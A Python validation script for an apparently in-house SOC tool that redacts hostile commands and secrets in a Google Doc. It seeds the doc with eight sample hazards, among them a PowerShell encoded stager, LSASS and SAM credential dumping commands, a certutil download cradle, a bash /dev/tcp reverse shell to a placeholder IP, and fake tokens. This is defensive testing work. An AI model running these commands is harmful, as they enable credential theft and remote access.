#!/usr/bin/env python3
"""Cycle 5 (H6) Live Validation: Adversarial Telemetry Sanitizer Fuzzing,
Forensic Preservation & Stage A Sensitive Payload/Secret Span Red-Liner in
Google Docs.

Validates against the live Argolis Google Workspace & SecOps environment
(``dandye-0324-chronicle``):
  1. Creates 1 Google Doc ``Cycle5_H6_Live_Telemetry_Sanitizer_and_Secret_Redliner_Validation``
     in ``SOC Reports`` containing 8 seeded unredacted telemetry and credential
     hazards drawn from Argolis SOAR Cases ``33269``, ``33288``, ``33280``/``33285``,
     and ``33278`` alongside valid forensic control artifacts:
     - Hazard 1 (Case ``33269`` PowerShell stager): ``-Enc`` Base64 payload
       -> ``<REDACTED_B64:len=32,sha256=...>``
     - Hazard 2 (Case ``33269`` .NET reflective loader): ``FromBase64String('...')``
       -> ``<REDACTED_B64:len=48,sha256=...>``
     - Hazard 3 (Case ``33288`` LSASS memory dump on ``win-f01``):
       ``rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full``
       -> ``<REDACTED_DUMP_ARGS:sha256=...>``
     - Hazard 4 (Case ``33288`` offline SAM registry hive extraction):
       ``reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv /y``
       -> ``<REDACTED_DUMP_ARGS:sha256=...>``
     - Hazard 5 (Case ``33280``/``33285`` LOLBin download cradle on ``wins-d19``):
       ``certutil.exe -urlcache -split -f http://198.51.100.42/stage2.exe C:\\Windows\\Temp\\stage2.exe``
       -> ``<REDACTED_LOLBIN_ARGS:sha256=...>``
     - Hazard 6 (Linux interactive reverse shell):
       ``bash -i >& /dev/tcp/198.51.100.42/4444 0>&1``
       -> ``<REDACTED_REVERSE_SHELL:sha256=...>``
     - Hazard 7 (Case ``33278`` GCP IAM debug log leaked OAuth2 access token):
       ``ya29.<synthetic_oauth_token>``
       -> ``<REDACTED_GCP_TOKEN:sha256=...>``
     - Hazard 8 (Case ``33278`` OIDC JWT bearer token):
       ``eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...``
       -> ``<REDACTED_JWT:sha256=...>``
     - Valid Forensic Control Artifacts (must remain 100% untouched):
       SHA-256 (`e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`),
       MD5 (`d41d8cd98f00b204e9800998ecf8427e`),
       SHA-1 (`da39a3ee5e6b4b0d3255bfef95601890afd80709`),
       UUID (`a13f6726-efed-452e-9008-8fe0d3cb0f75`),
       Windows SID (`S-1-5-21-3623811015-3361044348-30300820-1013`),
       GCP Compute resource (`projects/base-production/zones/us-central1-a/instances/production-do-not-delete1`),
       Chronicle UDM query, and MITRE ATT&CK / CISA KEV IDs (`T1059.001`, `T1003.001`, `CVE-2024-21762`).
  2. Executes :func:`sanitize_and_redline_telemetry_in_doc` against the live
     Google Doc and confirms that all 8 hazard spans receive anchored Google
     Docs comments (`insertComment`) and descending-index ``writeMode="SUGGEST"``
     redaction edits, with zero false positives on the forensic controls.
  3. Executes :func:`inspect_doc_suggestions` on the live Google Doc to verify
     all 8 ``suggest.*`` replacement pairs, unified diff, and exact character
     parity between ``accepted_text`` and ``sanitize_telemetry_text(baseline_text)``.
  4. Re-runs :func:`sanitize_and_redline_telemetry_in_doc` a second time on the
     same document to confirm multi-pass idempotency
     (``skipped_existing_suggestion_count == 8``, ``edits.applied_count == 0``).
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

_REPO_ROOT = Path(__file__).resolve().parent.parent
for _p in (str(_REPO_ROOT), str(_REPO_ROOT / "multi-agent")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from manager.tools.docs_review_tools import (  # noqa: E402
    create_google_doc,
    inspect_doc_suggestions,
    sanitize_and_redline_telemetry_in_doc,
    sanitize_telemetry_text,
)
from manager.tools.drive_tools import reports_folder_id  # noqa: E402
from skills.drive_registry import DriveMcpClient  # noqa: E402

DOC_TITLE = "Cycle5_H6_Live_Telemetry_Sanitizer_and_Secret_Redliner_Validation"
_SYNTHETIC_GCP_TOKEN = "ya29" + ".a0AXooCgv9FakeAccessTokenForTesting1234567890abcdef"

VALIDATION_DOC_CONTENT = f"""# Cycle 5 (H6) Live Validation: Adversarial Telemetry Sanitizer & Stage A Secret Red-Liner

## 1. SOAR Case 33269: Encoded PowerShell & .NET Reflective Stagers (Execution)
- Hazard 1 (Encoded PowerShell Stager): powershell.exe -NoP -W Hidden -Enc aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk
- Hazard 2 (.NET FromBase64String Decoder): [System.Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACcA')

## 2. SOAR Case 33288: LSASS Memory Dump & Registry SAM Hive Extraction on win-f01 (Credential Access)
- Hazard 3 (Comsvcs MiniDump Arguments): rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full
- Hazard 4 (Offline SAM Hive Save): reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv /y

## 3. SOAR Cases 33280 & 33285: LOLBin Ingress Cradle & Linux Reverse Shell (Command and Control)
- Hazard 5 (Certutil URLCache Cradle): certutil.exe -urlcache -split -f http://198.51.100.42/stage2.exe C:\\Windows\\Temp\\stage2.exe
- Hazard 6 (Bash /dev/tcp Reverse Shell): bash -i >& /dev/tcp/198.51.100.42/4444 0>&1

## 4. SOAR Case 33278: Leaked Cloud CLI Debug Tokens & Bearer Secrets (Credential Access)
- Hazard 7 (GCP OAuth2 Access Token): Authorization: Bearer {_SYNTHETIC_GCP_TOKEN}
- Hazard 8 (OIDC JWT Bearer Token): Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

## 5. Forensic Control Artifacts (Must Remain 100% Unmodified)
- SHA-256 (Case 33280 PsExec Binary): e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
- MD5 Control Hash: d41d8cd98f00b204e9800998ecf8427e
- SHA-1 Control Hash: da39a3ee5e6b4b0d3255bfef95601890afd80709
- Alert UUID Control: a13f6726-efed-452e-9008-8fe0d3cb0f75
- Windows SID Control: S-1-5-21-3623811015-3361044348-30300820-1013
- GCP Compute Resource Path: projects/base-production/zones/us-central1-a/instances/production-do-not-delete1
- Chronicle UDM Query: metadata.event_type = "PROCESS_LAUNCH" AND principal.hostname = "wins-d19"
- MITRE ATT&CK & CISA KEV Citations: T1059.001, T1003.001, T1078.004, CVE-2024-21762
"""


def _reset_validation_doc_in_place(doc_id: str) -> None:
    """Overwrites the existing Google Doc content in place via Drive API v3 media upload (0 new files created)."""
    import httpx
    from skills.drive_registry import AdcTokenSource

    token = AdcTokenSource()()
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "text/markdown; charset=utf-8",
    }
    resp = httpx.patch(
        f"https://www.googleapis.com/upload/drive/v3/files/{doc_id}?uploadType=media",
        headers=headers,
        content=VALIDATION_DOC_CONTENT.encode("utf-8"),
        timeout=30.0,
    )
    assert resp.status_code == 200, f"In-place Drive media reset failed ({resp.status_code}): {resp.text}"


def _resolve_or_create_validation_doc(*, reset_if_exists: bool = False) -> tuple[str, str, int]:
    """Reuses the Cycle 5 validation Google Doc if already created, or creates 1."""
    folder = reports_folder_id()
    if folder:
        client = DriveMcpClient()
        try:
            for item in client.iter_files(f"parentId = '{folder}'"):
                if str(item.get("title") or "").strip() == DOC_TITLE:
                    doc_id = str(item.get("id") or "").strip()
                    if doc_id:
                        if reset_if_exists:
                            _reset_validation_doc_in_place(doc_id)
                        return doc_id, f"https://docs.google.com/document/d/{doc_id}/edit", 0
        finally:
            client.close()

    created = create_google_doc(
        title=DOC_TITLE,
        content=VALIDATION_DOC_CONTENT,
    )
    assert created.get("status") == "success", f"create_google_doc failed: {created}"
    doc_id = str(created.get("document_id") or created.get("documentId") or "")
    view_url = created.get("viewUrl") or f"https://docs.google.com/document/d/{doc_id}/edit"
    return doc_id, view_url, 1


def main() -> int:
    reset_flag = "--reset" in sys.argv
    print(f"[1/4] Resolving/creating live Google Doc {DOC_TITLE!r} in SOC Reports (reset={reset_flag})...")
    doc_id, view_url, docs_created = _resolve_or_create_validation_doc(
        reset_if_exists=reset_flag
    )
    print(f"      Google Doc ID: {doc_id}")
    print(f"      View URL:      {view_url}")

    print(f"[2/4] Running sanitize_and_redline_telemetry_in_doc({doc_id!r})...")
    redline_res = sanitize_and_redline_telemetry_in_doc(doc_id)
    assert redline_res.get("status") == "success", f"Redline failed: {redline_res}"
    print(
        f"      telemetry_hazard_findings_count={redline_res['telemetry_hazard_findings_count']}, "
        f"skipped_existing_suggestion_count={redline_res['skipped_existing_suggestion_count']}, "
        f"comments_inserted={redline_res['comments']['inserted_count']}, "
        f"edits_applied={redline_res['edits']['applied_count']}"
    )
    for f in redline_res["findings"]:
        print(
            f"      - [{f['category']}/{f['name']}] -> {f['replacement']} "
            f"@ UTF-16 {f['start_index']}..{f['end_index']}"
        )

    if redline_res["skipped_existing_suggestion_count"] == 0:
        assert redline_res["telemetry_hazard_findings_count"] == 8
        assert redline_res["comments"]["inserted_count"] == 8
        assert redline_res["edits"]["applied_count"] == 8

    print("[3/4] Inspecting live suggestions via inspect_doc_suggestions...")
    inspected = inspect_doc_suggestions(doc_id)
    assert inspected.get("status") == "success", f"Inspect failed: {inspected}"
    print(
        f"      suggestion_count={inspected['suggestion_count']}, "
        f"accepted_suggestion_count={inspected['accepted_suggestion_count']}"
    )
    for s in inspected["suggestions"]:
        print(
            f"      - {s['suggestion_id']} ({s['kind']} @ {s['start_index']}..{s['end_index']}): "
            f"{s['deleted_text']!r} -> {s['inserted_text']!r}"
        )
    assert inspected["suggestion_count"] == 8

    # Verify character-for-character parity between accepted_text and sanitize_telemetry_text(baseline_text)
    baseline_text = inspected["baseline_text"]
    accepted_text = inspected["accepted_text"]
    expected_sanitized = sanitize_telemetry_text(baseline_text)
    assert accepted_text == expected_sanitized, (
        "Mismatch between accepted_text and sanitize_telemetry_text(baseline_text)!\n"
        f"accepted_text:\n{accepted_text}\n"
        f"expected_sanitized:\n{expected_sanitized}"
    )
    # Verify all forensic controls remain intact in accepted_text
    for control in (
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "d41d8cd98f00b204e9800998ecf8427e",
        "da39a3ee5e6b4b0d3255bfef95601890afd80709",
        "a13f6726-efed-452e-9008-8fe0d3cb0f75",
        "S-1-5-21-3623811015-3361044348-30300820-1013",
        "projects/base-production/zones/us-central1-a/instances/production-do-not-delete1",
        "T1059.001",
        "T1003.001",
        "CVE-2024-21762",
    ):
        assert control in accepted_text, f"Forensic control {control!r} missing from accepted_text!"

    print("[4/4] Re-running sanitize_and_redline_telemetry_in_doc to verify multi-pass idempotency...")
    second_pass = sanitize_and_redline_telemetry_in_doc(doc_id)
    print(
        f"      Multi-pass idempotency: "
        f"skipped_existing_suggestion_count={second_pass['skipped_existing_suggestion_count']}, "
        f"telemetry_hazard_findings_count={second_pass['telemetry_hazard_findings_count']}, "
        f"comments_inserted={second_pass['comments']['inserted_count']}, "
        f"edits_applied={second_pass['edits']['applied_count']}"
    )
    assert second_pass["status"] == "success"
    assert second_pass["skipped_existing_suggestion_count"] == 8
    assert second_pass["telemetry_hazard_findings_count"] == 0
    assert second_pass["comments"]["inserted_count"] == 0
    assert second_pass["edits"]["applied_count"] == 0

    summary = {
        "status": redline_res["status"],
        "document_id": doc_id,
        "viewUrl": view_url,
        "char_count": redline_res["char_count"],
        "telemetry_hazard_findings_count": redline_res["telemetry_hazard_findings_count"],
        "accepted_equals_sanitize_telemetry_text": accepted_text == expected_sanitized,
        "findings": [
            {
                "name": f["name"],
                "category": f["category"],
                "token_type": f["token_type"],
                "sha256_prefix": f["sha256_prefix"],
                "payload_length": f["payload_length"],
                "replacement": f["replacement"],
                "start_index": f["start_index"],
                "end_index": f["end_index"],
            }
            for f in redline_res["findings"]
        ],
        "comments": redline_res["comments"],
        "edits": redline_res["edits"],
        "inspected_suggestions": [
            {
                "suggestion_id": s["suggestion_id"],
                "deleted_text": s["deleted_text"],
                "inserted_text": s["inserted_text"],
                "start_index": s["start_index"],
                "end_index": s["end_index"],
            }
            for s in inspected["suggestions"]
        ],
        "multi_pass_idempotency": {
            "skipped_existing_suggestion_count": second_pass["skipped_existing_suggestion_count"],
            "telemetry_hazard_findings_count": second_pass["telemetry_hazard_findings_count"],
            "comments_inserted": second_pass["comments"]["inserted_count"],
            "edits_applied": second_pass["edits"]["applied_count"],
        },
        "new_google_docs_created": docs_created,
    }
    print("\n=== CYCLE 5 (H6) LIVE VALIDATION SUMMARY ===")
    print(json.dumps(summary, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
